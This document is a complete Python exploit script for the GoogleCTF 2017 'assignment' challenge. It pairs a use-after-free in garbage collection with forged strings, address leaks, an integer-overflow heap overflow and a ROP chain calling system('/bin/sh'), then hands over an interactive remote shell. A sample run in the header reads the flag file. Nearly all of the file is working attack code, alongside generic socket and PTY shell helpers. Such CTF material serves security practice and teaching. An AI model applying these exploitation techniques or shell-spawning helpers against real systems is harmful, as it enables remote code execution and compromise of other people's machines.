#!/usr/bin/env python3
#
# Exploit for "assignment" of GoogleCTF 2017
#
# CTF-quality exploit...
#
# Slightly simplified and shortened explanation:
#
# The bug is a UAF of one or both values during add_assign() if a GC is
# triggered during allocate_value(). The exploit first abuses this to leak a
# pointer into the heap by confusing an Integer Value with a Property. It then
# abuses the UAF differently to create a fake String instance which is
# concatenated and returned. By faking a String in the heap, we can read
# arbitrary memory. We leak the addresses of libc and the stack. Next the
# exploit does some heap feng shui, then fakes a string with length 0xffffffXX,
# which triggers an integer overflow during string_concat(). This gives us a
# heap-based buffer overflow. With that we first corrupt a Property to point
# into the stack, then overwrite the length of the fake string with 0 to stop
# the memcpy. We leak the address of the binary from the return address. Next
# we write a value to the fake property. This writes a pointer to the heap into
# the stack. With that we corrupt only the first byte of the input buffer
# pointer so it now points further down into the stack. The next call to
# readline() by the application then writes into the stack frame of readline()
# and ultimately overwrites the return address => we get ROP:
#
# [+] Heap base @ 0x55cd3d465000
# [+] libc @ 0x7f7ea1f79000
# [+] stack @ 0x7ffcf044f448
# [+] /bin/sh @ 0x7f7ea20f9103
# [+] input_buf @ 0x7ffcf044f120
# [+] return address @ 0x7ffcf044f118
# [+] binary @ 0x55cd3c696000
# [+] offset to return address: 0x18
# [+] property name: j
# id
# uid=1337(user) gid=1337(user) groups=1337(user)
# ls
# assignment
# flag.txt
# cat flag.txt
# CTF{d0nT_tHrOw_0u7_th1nG5_yoU_5ti11_u53}
#
# Author: Samuel <saelo> Groß
#

import socket
import termios
import tty
import time
import sys
import select
import os
import re
import telnetlib
import string
from struct import pack, unpack
from binascii import hexlify, unhexlify

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#           Global Config
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#TARGET = ('localhost', 4444)
TARGET = ('assignment.ctfcompetition.com', 1337)

# Enable "wireshark" mode, pretty prints all incoming and outgoing network traffic.
NETDEBUG = False

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#       Encoding and Packing
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def e(d):
    """Encode the given string instance using UTF-8."""
    return d.encode('UTF-8')

def d(d):
    """Decode the given bytes instance using UTF-8."""
    return d.decode('UTF-8')

def p32(d):
    """Return d packed as 32-bit unsigned integer (little endian)."""
    return pack('<I', d)

def u32(d):
    """Return the number represented by d when interpreted as a 32-bit unsigned integer (little endian)."""
    return unpack('<I', d)[0]

def p64(d):
    """Return d packed as 64-bit unsigned integer (little endian)."""
    return pack('<Q', d)

def u64(d):
    """Return the number represented by d when interpreted as a 64-bit unsigned integer (little endian)."""
    return unpack('<Q', d)[0]

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Output
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def print_good(msg):
    print(ansi(Term.BOLD) + '[+] ' + msg + ansi(Term.CLEAR))

def print_bad(msg):
    print(ansi(Term.COLOR_MAGENTA) + '[-] ' + msg + ansi(Term.CLEAR))

def print_info(msg):
    print('[*] ' + msg)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#              Misc.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def bytes_and_strings_are_cool(func):
    """Decorator to encode arguments that are string instances."""
    def inner(*args, **kwargs):
        nargs = tuple(map(lambda arg: e(arg) if isinstance(arg, str) else arg, args))
        nkwargs = dict(map(lambda k, v: (k, e(v)) if isinstance(v, str) else (k, v), kwargs))
        return func(*nargs, **nkwargs)
    return inner

def validate(data, badchars):
    """Assert that no badchar occurs in data."""
    assert(all(b not in data for b in badchars))

def is_printable(b):
    """Return true if the given byte is a printable ASCII character."""
    return b in e(string.printable)

def hexdump(data):
    """Return a hexdump of the given data. Similar to what `hexdump -C` produces."""

    def is_hexdump_printable(b):
        return b in b' 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[]{}\\|\'";:/?.,<>'

    lines = []
    chunks = (data[i*16:i*16+16] for i in range((len(data) + 15) // 16))

    for i, chunk in enumerate(chunks):
        hexblock = ['{:02x}'.format(b) for b in chunk]
        left, right = ' '.join(hexblock[:8]), ' '.join(hexblock[8:])
        asciiblock = ''.join(chr(b) if is_hexdump_printable(b) else '.' for b in chunk)
        lines.append('{:08x}  {:23}  {:23}  |{}|'.format(i*16, left, right, asciiblock))

    return '\n'.join(lines)

class Term:
    COLOR_BLACK = '30'
    COLOR_RED = '31'
    COLOR_GREEN = '32'
    COLOR_BROWN = '33'
    COLOR_BLUE = '34'
    COLOR_MAGENTA = '35'
    COLOR_CYAN = '36'
    COLOR_WHITE = '37'
    CLEAR = '0'

    UNDERLINE = '4'
    BOLD = '1'

    ESCAPE_START = '\033['
    ESCAPE_END = 'm'

# TODO rename to style and append Term.Clear ?
def ansi(*args):
    """Construct an ANSI terminal escape code."""
    code = Term.ESCAPE_START
    code += ';'.join(args)
    code += Term.ESCAPE_END
    return code

class DisconnectException(Exception):
    pass

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#        Pattern Generation
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Pattern:
    """De-Bruijn sequence generator."""
    alphabet = string.digits + string.ascii_letters

    def __init__(self, length):
        if length <= len(self.alphabet):
            self._seq = self.alphabet[:length]
        elif length <= len(self.alphabet) ** 2:
            self._seq = self._generate(2)[:length]
        elif length <= len(self.alphabet) ** 3:
            self._seq = self._generate(3)[:length]
        elif length <= len(self.alphabet) ** 4:
            self._seq = self._generate(4)[:length]
        else:
            raise Exception("Pattern length is way to large")

    def _generate(self, n):
        """Generate a De Bruijn sequence."""
        # See https://en.wikipedia.org/wiki/De_Bruijn_sequence

        k = len(self.alphabet)
        a = [0] * k * n
        sequence = []

        def db(t, p):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)
        db(1, 1)
        return ''.join(self.alphabet[i] for i in sequence)

    def bytes(self):
        """Return this sequence as bytes."""
        return e(self._seq)

    def __str__(self):
        """Return this sequence as string."""
        return self._seq

    @bytes_and_strings_are_cool
    def offset(self, needle):
        """Returns the index of 'needle' in this sequence.

        'needle' should be of type string or bytes. If an integer is provided
        it will be treated as 32-bit or 64-bit little endian number, depending
        on its bit length.
        """
        if isinstance(needle, int):
            if needle.bit_length() <= 32:
                needle = p32(needle)
            else:
                needle = p64(needle)
        needle = d(needle)

        idx = self._seq.index(needle)
        if self._seq[idx+len(needle):].find(needle) != -1:
            raise ValueError("Multiple occurances found!")

        return idx

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Network
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Channel:
    """Convenience wrapper around a socket."""
    OUTGOING_COLOR = Term.COLOR_RED
    INCOMING_COLOR = Term.COLOR_BLUE

    def __init__(self, sock, verbose):
        self._s = sock
        self._verbose = verbose
        self._buf = bytearray()

    def _prettyprint(self, data, outgoing):
        """Prettyprint the given data.

        This does the following: All data that is valid ASCII is colorized according to the direction of the traffic.
        Everything else is converted to hex, then printed in bold and underline for visibility.

        Only ASCII is supported as of now. This might be the better choice anyway since otherwise valid UTF-8 might be
        detected in arbitrary binary streams.
        """
        TEXT = 0
        BINARY = 1
        # Various Thresholds for the heuristics below
        X = 4
        Y = 16
        Z = 2


        color = self.OUTGOING_COLOR if outgoing else self.INCOMING_COLOR

        # Step 1: Tag every byte of the input stream with it's detected type.
        parts = []
        curr = ''
        for b in data:
            if is_printable(b):
                parts.append((TEXT, b))
            else:
                parts.append((BINARY, b))

        # Step 2: Merge neighboring bytes of the same type and convert the sequences to type bytes.
        i = 0
        mergedparts = []
        while i < len(parts):
            t = parts[i][0]
            arr = [parts[i][1]]
            j = i+1
            while j < len(parts) and parts[j][0] == t:
                arr.append(parts[j][1])
                j += 1
            i = j

            # Heuristic: If there are Y ASCII bytes with the same value followed by Z ASCII bytes followed by binary data, treat the Z bytes as binary as well.
            extra = []
            if t == TEXT and len(arr) > Y and i < len(parts) - 1:
                mid = len(arr) - Z - 1
                start, end = mid, mid
                char = arr[mid]
                while start >= 0 and arr[start] == char:
                    start -= 1
                while end < len(arr) and arr[end] == char:
                    end += 1

                # start and end point outside the range of equal-valued characters now.
                if end - start >= Y+2 and end < len(parts):
                    extra = arr[end:]
                    arr = arr[:end]

            mergedparts.append((t, bytes(arr)))
            if extra:
                mergedparts.append((BINARY, bytes(extra)))

        parts = mergedparts

        # Step 3: Merge all parts and prepend the ansi terminal escape sequences for the given type.
        buf = ''
        last = None
        for tag, value in parts:
            # Heuristic: If there is an ASCII sequence of X bytes or less surrounded by binary data, treat those as binary as well.
            if tag == TEXT and len(value) <= X and last == BINARY:
                tag = BINARY

            if tag == TEXT:
                buf += ansi(Term.CLEAR) + ansi(color)
            else:
                buf += ansi(color, Term.BOLD, Term.UNDERLINE)
                value = hexlify(value)

            buf += d(value)
            last = tag

        buf += ansi(Term.CLEAR)

        # Step 4: Print :)
        print(buf, end='')
        sys.stdout.flush()

    def setVerbose(self, verbose):
        """Set verbosity of this channel."""
        self._verbose = verbose

    def recv(self, n=4096):
        """Return up to n bytes of data from the remote end.

        Buffers incoming data internally.

        NOTE: You probably shouldn't be using this method. Use one of the other recvX methods instead.
        """
        if len(self._buf) < n:
            buf = self._s.recv(65536)
            if not buf and not self._buf:
                raise DisconnectException("Server disconnected.")
            if self._verbose:
                self._prettyprint(buf, False)
            self._buf += buf

        # This code also works if n > len(self._buf)
        buf = self._buf[:n]
        self._buf = self._buf[n:]
        return buf

    def recvn(self, n):
        """Return exactly n bytes of data from the remote end."""
        data = []
        while len(data) != n:
            data.append(self.recv(1))

        return b''.join(data)

    @bytes_and_strings_are_cool
    def recvtil(self, delim):
        """Read data from the remote end until delim is found in the data.

        The first occurance of delim is included in the returned buffer.
        """
        buf = b''
        # TODO maybe not make this O(n**2)...
        while not delim in buf:
            buf += self.recv(1)
        return buf

    def recvregex(self, regex):
        """Receive incoming data until it matches the given regex.

        Returns the match object.

        IMPORTANT: Since the data is coming from the network, it's usually
        a bad idea to use a regex such as 'addr: 0x([0-9a-f]+)' as this function
        will return as soon as 'addr: 0xf' is read. Instead, make sure to
        end the regex with a known sequence, e.g. use 'addr: 0x([0-9a-f]+)\\n'.
        """
        if isinstance(regex, str):
            regex = re.compile(regex)
        buf = ''
        match = None

        while not match:
            buf += d(self.recv(1))
            match = regex.search(buf)

        return match

    def recvline(self):
        """Receive and return a line from the remote end.

        The trailing newline character will be included in the returned buffer.
        """
        return self.recvtil('\n')

    def send(self, buf):
        """Send all data in buf to the remote end."""
        if self._verbose:
            self._prettyprint(buf, True)
        self._s.sendall(buf)

    def sendnum(self, n):
        """Send the string representation of n followed by a newline character."""
        self.sendline(str(n))

    @bytes_and_strings_are_cool
    def sendline(self, l):
        """Prepend a newline to l and send everything to the remote end."""
        self.send(l + b'\n')

    def interact(self):
        """Interact with the remote end: connect stdout and stdin to the socket."""
        # TODO maybe use this at some point: https://docs.python.org/3/library/selectors.html
        self._verbose = False
        try:
            while True:
                available, _, _ = select.select([sys.stdin, self._s], [], [])
                for src in available:
                    if src == sys.stdin:
                        data = sys.stdin.buffer.read1(1024)        # Only one read() call, otherwise this breaks when the tty is in raw mode
                        self.send(data)
                    else:
                        data = self.recv(4096)
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except DisconnectException:
            print_info("Server disconnected.")
            return

#
# Telnet emulation
#
def telnet(shell='/bin/bash'):
    """Telnet emulation.

    Opens a PTY on the remote end and connects the master side to the socket.
    Then spawns a shell connected to the slave end and puts the controlling TTY
    on the local machine into raw mode.
    Result: Something similar to a telnet/(plaintext)ssh session.

    Vim, htop, su, less, etc. will work with this.

    !!! This function only works if the channel is connected to a shell !!!
    """
    assert(sys.stdin.isatty())
    c.setVerbose(False)

    # Open a PTY and spawn a bash connected to the slave end on the remote side
    code = 'import pty; pty.spawn([\'{}\', \'-i\'])'.format(shell)
    sendline('python -c "{}"; exit'.format(code))
    time.sleep(0.5)           # No really good way of knowing when the shell has opened on the other side...
                              # Should maybe put some more functionality into the inline python code instead.

    # Save current TTY settings
    old_settings = termios.tcgetattr(sys.stdin.fileno())

    # Put TTY into raw mode
    tty.setraw(sys.stdin)

    # Resize remote terminal
    # Nice-to-have: also handle terminal resize
    cols, rows = os.get_terminal_size(sys.stdin.fileno())
    sendline('stty rows {} cols {}; echo READY'.format(rows, cols))
    recvtil('READY\r\n')            # terminal echo
    recvtil('READY\r\n')            # command output

    interact()

    # Restore previous settings
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)

#
# Convenience wrappers that use the global socket instance
#
def send(b):
    c.send(b)

def sendline(l):
    c.sendline(l)

def sendnum(n):
    c.sendnum(n)

def recv(n):
    return c.recv(n)

def recvtil(delim):
    return c.recvtil(delim)

def recvn(n):
    return c.recvn(n)

def recvline():
    return c.recvline()

def recvregex(r):
    return c.recvregex(r)

def interact():
    c.interact()

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#          Global Setup
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
s = socket.create_connection(TARGET)
#s.settimeout(2)
c = Channel(s, NETDEBUG)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#         Your code here
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ALPHABET = 'abcdefghijklmnopqrstuvwxyz'

def evl(code):
    sendline(code)

def readvar(name):
    evl('=')
    recvtil('Bad token: 0-1\n> ')
    evl(name)
    response = recvtil('> ')
    return response.split(b'\n')[0]

def readintvar(name):
    return int(d(readvar(name)))

def readstrvar(name):
    return readvar(name)[1:-1]

def heapleak():
    """Free the lhs and rhs values during add_assign. ..."""
    for i in range(16):
        evl('{}'.format(i))

    # Trigger heap info leak
    evl('h=0+0')
    return readintvar('h') & 0xfffffffffffff000

def gc(remaining):
    """Trigger gargabe collection"""
    for i in range(remaining):
        evl('{}'.format(i))

def leak(addr, length):
    """Leaks process memory by abusing the UAF to temporarily inject a fake string."""
    fake_str_addr = heap_base + 0xb0
    fake_str = p64(length) + p64(addr)
    evl(b'l="' + fake_str + b'"')             # will be at offset 0xb0 from heap start

    for i in range(15):
        evl('{}'.format(i))
    # 19 slots filled

    # allocate 20th slot with integer value containing the addr of our fake string. The allocate_value() during do_add_assign triggers GC and frees the lhs value
    # Then the output value is allocated into the same slot. Since the output value is String (type of x),
    # lhs is turned into a string with controlled pointer
    evl('a={}+x'.format(fake_str_addr))
    gc(16)
    return readstrvar('a')[0:length]


def leak2(addr, length):
    """Same as above, but different offsets..."""
    fake_str_addr = heap_base + 0x170
    fake_str = p64(length) + p64(addr)
    evl(b'l="' + fake_str + b'"')             # will be at offset 0xb0 from heap start

    for i in range(12):
        evl('{}'.format(i))

    evl('a={}+x'.format(fake_str_addr))
    return readstrvar('a')[0:length]


def pwn():
    global heap_base

    recvtil('>')

    evl('x="XXXXXXXXXXXXXXXX"')             # Workaround, need global object or else GC will crash
    # 2 slots always filled from now on (global object and int value 1337)

    heap_base = heapleak()
    # 3 slots always filled from now on

    print_good("Heap base @ 0x{:x}".format(heap_base))

    # Create a smallbin chunk so we can leak a libc pointer
    evl('"{}"'.format('A' * 0x100))
    gc(20 - 4)


    # Leak freelist pointers pointing into the libc
    heap_mem = leak(heap_base, 0x1000)
    for i in range(0, len(heap_mem)-16, 8):
        # Search for 2 consecutive pointers, those will be the flink and blink of the freed smallbin chunk
        flink = u64(heap_mem[i:i+8])
        blink = u64(heap_mem[i+8:i+16])
        if (abs(flink - heap_base) > 0x10000 and
            flink > 0x7f0000000000 and
            flink < 0x800000000000 and
            blink > 0x7f0000000000 and
            blink < 0x800000000000):
            break
    else:
        print_bad("No freelist pointers found :(")
        return

    libc = flink - 0x3c1928
    print_good("libc @ 0x{:x}".format(libc))


    # Leak stack pointer by reading environ pointer in libc
    env_ptr = u64(leak2(libc + 0x3c44a0, 8))
    print_good("stack @ 0x{:x}".format(env_ptr))


    # Calculate addresses
    system = libc + 0x46590
    bin_sh = libc + 0x180103
    pop_rdi = libc + 0x22b9a
    pop_rsi = libc + 0x24885
    pop_rdx = libc + 0x1b8e
    add_rsp_0x48 = libc + 0xf5b8b

    print_good("/bin/sh @ 0x{:x}".format(bin_sh))

    input_buf = env_ptr - 0x328
    print_good("input_buf @ 0x{:x}".format(input_buf))
    ret_addr = env_ptr - 0x328 - 8
    print_good("return address @ 0x{:x}".format(ret_addr))


    # 5 slots always filled from now

    #
    # Heap spray with Property instances to get a controlled heap layout again
    #
    # Make some objects
    evl('l.a=x')
    evl('h.a=x')
    evl('a.a=x')
    evl('b.a=x')
    evl('c.a=x')
    evl('d.a=x')
    evl('e.a=x')
    evl('f.a=x')

    # Trigger GC
    for i in range(9):
        evl('"{}"'.format('A' * 0x10))
    evl('1337')

    # 10 slots used

    # Allocate lots of properties (but no values)
    for o in ['l', 'a', 'h', 'a', 'b', 'c', 'd', 'e', 'f']:
        for p in ALPHABET:
            evl('{}.{}=x'.format(o, p))


    # Set up heap layout for unbounded heap overflow. We need the following layout:
    # | chunk to overflow from | ... | Property to corrupt | ... | Fake string |
    # We overflow into "Fake string" to set it's size to 0 and avoid a segfault.
    for i in range(6):
        evl('1337')

    # Create some properties
    for i in 'ghijk':
        evl('{}=x'.format(i))

    # Fake string with length 0xffffffXX => leads to an integer overflow during string_concat and subsequently a heap buffer overflow
    fake_str = p64(0xffffffffffffffff - 0xf - (0x180 - 0x10)) + p64(0x414141414141) + b'D'*0xf0
    evl(b'n="' + fake_str + b'"')
    payload = b'\x00' * 64 + p64(ord('p')) + p64(input_buf + 16 + 0x100) +p64(input_buf-7)
    payload += b'\x00' * (0x180 - len(payload))
    evl(b'o="' + payload + b'"')

    fake_str_addr = heap_base + 0x1e80
    # Trigger the overflow
    evl('p=o+{}'.format(fake_str_addr))


    # Set up a fake string property in the stack ('p' points to it). We need to leak the binary base from the return address
    payload = b'A' * 0x100
    payload += p64(1) + p64(input_buf + 16 + 0x100 + 0x18) + p64(0)
    payload += p64(8) + p64(ret_addr)
    evl(payload)

    binary = readstrvar('p')
    binary = u64(binary) - 2769
    print_good("binary @ 0x{:x}".format(binary))

    offset_to_ret = ret_addr - (input_buf & 0xffffffffffffff00)
    print_good("offset to return address: 0x{:x}".format(offset_to_ret))

    # Some unfortunate restrictions...
    if offset_to_ret > 0x28 or offset_to_ret < 0:
        print_bad("Bad offset")
        return

    prop_name = p64(binary + 0xAC9)[1]
    if prop_name < ord('A') or prop_name > ord('z'):
        print_bad("Bad propery name: {}".format(prop_name))
        return

    prop_name = chr(prop_name)
    print_good("property name: {}".format(prop_name))

    # Write ROP chain into stack
    payload = b'A' * 56
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    validate(payload, [b'\n'])
    evl(payload)

    # Trigger corruption of InputBuffer.ptr to point further down in the stack
    evl('{}=42'.format(prop_name))

    # Next input will be written into the stack frame of readline(). Overwrite the return address with "add rsp, 0x48 ; ret"
    payload = b'A'*offset_to_ret
    payload += p64(add_rsp_0x48)
    validate(payload, [b'\n'])
    evl(payload)

    # Wait a short while and drop into interactive mode == shell
    time.sleep(0.5)

    interact()

if __name__ == '__main__':
    pwn()
